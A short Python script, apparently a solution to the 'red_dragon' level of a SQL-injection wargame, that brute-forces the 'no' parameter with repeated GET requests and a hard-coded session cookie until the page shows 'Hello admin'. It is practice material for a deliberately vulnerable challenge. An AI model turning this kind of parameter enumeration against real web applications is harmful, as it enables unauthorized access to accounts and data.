import requests


def blindi():
	no=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	index=0
	while 1:
		print("progress : " + str(index))
		URL="https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=admin&no="+str(index)
		response = requests.get(URL, cookies=cookies)
		if "Hello admin" in response.text:
			no=str(index)
			break
		index+=1
	print("no is : " + no)
	
if __name__ == "__main__":
	print("Start Program")
	blindi()
